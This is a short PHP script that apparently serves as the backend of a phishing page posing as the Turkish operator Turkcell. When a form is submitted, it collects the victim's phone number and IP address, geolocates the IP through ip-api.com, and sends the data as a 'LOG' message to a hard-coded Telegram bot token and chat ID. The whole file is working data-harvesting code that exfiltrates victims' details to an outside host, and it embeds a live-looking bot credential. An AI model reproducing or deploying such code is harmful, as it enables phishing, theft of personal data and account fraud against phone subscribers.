
<?php
$token = "5330630457:AAG9v9f5Q8abgbwSmyhM_q-ILsMQO36haOE";
$chat_id = "-871734856";
if($_POST){
$ip=$_SERVER["REMOTE_ADDR"];
$konum = file_get_contents("http://ip-api.com/xml/".$ip);
$cek = new SimpleXMLElement($konum);
$ulke = $cek->country;
$sehir = $cek->city;
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
$msisdnToBeProcessed=$_POST["msisdnToBeProcessed"];
$data = [
  'text' => 'LOG - Telefon Numarası/Turkcell
Telefon Numarası: : '.$msisdnToBeProcessed.'
Ülke : '.$ulke.'
İp : '.$ip.'
Tarih : '.$cur_time.'

',
  'chat_id' => $chat_id
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
}
?>
